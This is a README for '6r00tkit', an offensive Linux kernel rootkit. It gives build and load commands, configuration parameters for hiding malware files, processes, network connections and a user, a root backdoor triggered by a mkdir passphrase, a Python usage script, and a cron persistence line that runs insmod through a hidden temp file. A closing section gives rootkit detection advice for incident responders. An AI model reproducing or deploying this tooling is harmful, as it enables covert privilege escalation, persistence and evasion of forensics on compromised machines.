![6r00tkit Logo](https://mauricelambert.github.io/info/kernel/security/6r00tkit_small.png "6r00tkit logo")

# 6r00tkit

## Description

6r00tkit (Grootkit) is a rootkit used:
 1. to hide and protect itself and another rootkit
 2. to hide malwares and persistence file for 6r00tkit
 3. to hide processes
 4. to hide connections
 5. to set root permissions on a process (privilege escalation)

How it's works:
 - Remove itself and other rootkit from the kernel modules lists (*procfs* and *sysfs*)
 - Permanently use itself and the other rootkit to block module unloading
 - Hooks 9 syscalls:
     - `mkdir`, to get the root permissions for any process you may use the passphrase in `mkdir` syscall (default passphrase is `1 4m 6r00t`)
     - `kill`
         - to hide a process you may use the special signal in `kill` syscall (default is `14600` - numbers in `1 4m 6r00t`)
         - to hide connections with specific IPv4 you should `kill` the 4 bytes integer representing the IPv4 with the special signal (default is `0xdead`)
         - to hide connections with specific destination port you should `kill` the port number using the special signal (default is `0xbeef`)
         - to hide connections with specific source port you should `kill` the port number using the special signal (default is `666`)
         - to be undetectable the `kill` syscall will be called and it will return the error code for invalid signal
     - `getdents64` to hide process and files (process directory in `/proc` and customizable malware file and directory)
     - `getdents` to hide process and files (process directory in `/proc` and customizable malware file and directory)
     - `recvmsg` to hide connection from socket (like `ss` command)
     - `openat`, `open`, `fstat`, `newfstatat`, `stat`, `statx` to modify timestamps on files (*access*, *creation* and *modify* timestamps to block investigations and forensic) and hide files
 - Hooks 5 kernel functions:
     - `tcp4_seq_show`, `udp4_seq_show`, `tcp6_seq_show` and `udp6_seq_show` to hide connections from `/proc/net/tcp`, `/proc/net/udp`, `/proc/net/tcp6` and `/proc/net/udp6` (like `netstat` command)
     - `current_time` to change *creation* timestamp on files


## Requirements

 - Linux system
 - Root permissions to load the module

## Build

```bash
wget https://github.com/mauricelambert/6r00tkit/archive/refs/heads/main.zip
unzip main.zip
cd 6r00tkit-main/
bash compile.sh
```

## Load

### Default parameters

```bash
sudo insmod ./6r00tkit.ko
```

### Custom parameters

```bash
sudo insmod ./6r00tkit.ko modulename="other_rootkit" passphrase="s3cr3t" processsignal=666 rootkitdirectory="/rootkit/directory" rootkitfile="rootkit.ko" persistencedirectory="/persistence/directory" persistencefile="mycron" malwarefiles="1.malware,malware.bin,malware.elf,exploit.py,reverseshell.exe" ipsignal=49395 sourceportsignal=24589 destinationportsignal=5037 hiddenuser="malicious-user"
```

 - The `modulename` parameter can be used to hide and protect another kernel module
 - The `passphrase` parameter can be used to change the passphrase used to get root permissions with `mkdir` syscall
 - The `processsignal` parameter can be used to change the signal to hide process by it's PID and `kill` syscall
 - The `rootkitdirectory` this parameter should be the directory where rootkits (`6r00tkit` and the other rootkit if used) are stored (default is `/root/`)
 - The `rootkitfile` parameter can be used to change the default `6r00tkit` filename
 - The `persistencedirectory` parameter should be the directory where persistence file is stored (default is `/etc/cron.d`)
 - The `persistencefile` parameter should be the persistence filename (default is `6r00tkit`)
 - The `malwarefiles` parameter should be the malwares filenames (default is an array containing only `reverseshell`)
 - The `ipsignal` parameter can be used to change the special `kill` signal which can hide connections with a specific IPv4
 - The `sourceportsignal` parameter can be used to modify the special `kill` signal which can hide connections with a specific source port
 - The `destinationportsignal` parameter can be used to modify the special `kill` signal which can hide connections with a specific destination port
 - The `hiddenuser` to hide a user logged in (now is not complete, hide only in `who` command)

## Usages

You can use it like the following with python (or use it with any program and script, you only need to call specific syscalls with specific values):

```python
from os import mkdir, getuid, kill, listdir, getpid, system
from ipaddress import ip_address
from socket import socket
from ctypes import CDLL

################
# HIDE PROCESS #
################

pid = getpid()
print("PID:", pid)
print("Process found in /proc", "\n".join(x for x in listdir("/proc/") if x.isdigit() and int(x) == pid))
system("ps aux | grep python")
kill(getpid(), 14600) # i use the default signal, you should use your own signal if added as parameters on load
print("Process found in /proc", "\n".join(x for x in listdir("/proc/") if x.isdigit() and int(x) == pid))
system("ps aux | grep python")

####################
# ROOT PERMISSIONS #
####################

print("Current UID:", getuid())
system("whoami")
mkdir("1 4m 6r00t") # i use the default passphrase, you should use your own passphrase if added as parameters on load
print("Current UID:", getuid())
system("whoami")

#########################
# HIDE IPv4 CONNECTIONS #
#########################

syscall = CDLL(None).syscall
KILL = 62

s = socket()
s.connect(("8.8.8.8", 53))
if not system("grep 08080808:35 /proc/net/tcp"):
    print("Connection found")

ip_integer_value = int(ip_address("8.8.8.8"))
# OR
ip_integer_value = sum([x << (i * 8) for i, x in enumerate((8, 8, 8, 8)[::-1])])
# OR
ip_integer_value = int.from_bytes(bytes((8, 8, 8, 8)))
syscall(KILL, ip_integer_value, 0xdead) # i use the default signal, you should use your own signal if added as parameters on load

if system("grep 08080808:35 /proc/net/tcp"):
    print("Connection not found")

s.close()

###################################
# HIDE CONNECTIONS BY SOURCE PORT #
###################################

s = socket()
s.bind(("0.0.0.0", 59485))
s.connect(("4.4.4.4", 53))
if not system("grep 04040404:35 /proc/net/tcp"):
    print("Connection found")

try:kill(59485, 666) # i use the default signal, you should use your own signal if added as parameters on load
except:pass

if system("grep 04040404:35 /proc/net/tcp"):
    print("Connection not found")

s.close()

########################################
# HIDE CONNECTIONS BY DESTINATION PORT #
########################################

s = socket()
s.connect(("1.1.1.1", 53))
if not system("grep 01010101:35 /proc/net/tcp"):
    print("Connection found")

try:kill(53, 0xbeef) # i use the default signal, you should use your own signal if added as parameters on load
except:pass

if system("grep 01010101:35 /proc/net/tcp"):
    print("Connection not found")

s.close()
```

You cannot use `mkdir` command in bash or other shell script because the `mkdir` process will get the root permissions and not the shell process used to start the script.

## Persistence

You can reload the kernel module on reboot with a single cronjob, write the following content in the filename `/etc/cron.d/6r00tkit`:

```cron
@reboot root /bin/bash -c 'echo "/bin/sleep 10; /sbin/insmod /path/to/6r00tkit.ko" > /tmp/.placeholder; /bin/bash /tmp/.placeholder; /bin/rm -f /tmp/.placeholder'
```

## Rootkit detection

### Detection on live system

There is no way to detect a good rootkit on live system, but there is some techniques to try to detect it:

 - Analyze hidden processes
     1. Download and start `GetHiddenProcesses` program with root permissions
     2. Analyze output: there are many processes hidden by Operating System you should defined for each hidden process if it's malicious or not
     3. **Attackers should be active to detect it with this method**
     4. **Rootkit can change a PID to be undetectable**
 - Detect hidden connections
     1. Download `DetectHiddenConnections`
     2. Start the executable with root permissions
     3. Check all outputs, some network flux will be closed by kernel faster than checks, there are many false positives on UDP and few false positives on TCP
     4. **Attackers should be active to detect it with this method**
 - Detect error messages loading rootkit multiple times
     1. The `dmesg` command prints errors when kernel module load fails, a bad persistence can try to load rootkit regularly that cause errors (a kernel module cannot be loaded multiple times)
     2. **Rootkit can block or remove specific logs**
 - Detect anomalies
     1. Analyse logs to find anomalies:
         - logged in user not visible with `who`
         - `insmod` commands
         - firewall logs with unused ports or unknown IP addresses
         - syscall logs ([sys_finit_module](https://github.com/torvalds/linux/blob/453f5db0619e2ad64076aab16ff5a00e0f7c53a2/arch/x86/entry/syscalls/syscall_64.tbl#L324C26-L324C42), [sys_init_module](https://github.com/torvalds/linux/blob/453f5db0619e2ad64076aab16ff5a00e0f7c53a2/arch/x86/entry/syscalls/syscall_64.tbl#L186C25-L186C40))
         - processes creation invisible in `/proc`
         - ...
     2. **Rootkit can block or remove specific logs**
 - Use common tools to detect documented and know rootkit
     1. Try to use [rkhunter](https://github.com/youngunix/rkhunter) or [chkrootkit](https://github.com/Magentron/chkrootkit) to detect documented rootkits signatures
     2. **This tools is not maintained**
     3. **Modify rootkits to bypass those open source tools is easy**
     4. **Limited to public signatures on known and non-recent rootkits**
 - Analyze stack trace
     1. Try to get a stack trace with kernel errors (for example hook the `tcp4_seq_show` to pass `NULL` as argument that cause an error)
     2. Use `dmesg` to print errors logs and get the stack trace
 - Analyze syscalls and kernel functions addresses
     1. Download `GetKernelAddresses` source code and compile it with `make` command
     2. Use `DetectKernelHooking` in the same directory than `GetKernelAddresses` compilation with root permissions

**/!\ All of this methods can be altered by a rootkit and they are not discreet, attackers can detect you and launch irreversible malicious actions !**

Another important element is: working on live system will remove many attackers traces (access files timestamps for example).

I written this documentation to help SOC analyst when no other solutions is possible in incident response. I recommend to use the following methods.

### Detection offline

There are good ways to detect rootkit:

 1. you should analyze a copy of raw hard disk to found the malicious kernel module, persistence files and malwares
 2. you should analyze the logs in the SIEM, with a good logging policy, you should have many traces of the first rootkit load, the exploit used to get remote code execution and the exploit used to elevate privileges
 3. you should analyze full memory dump to checks syscalls hooking and functions hooking

## Licence

Licensed under the [GPL, version 3](https://www.gnu.org/licenses/).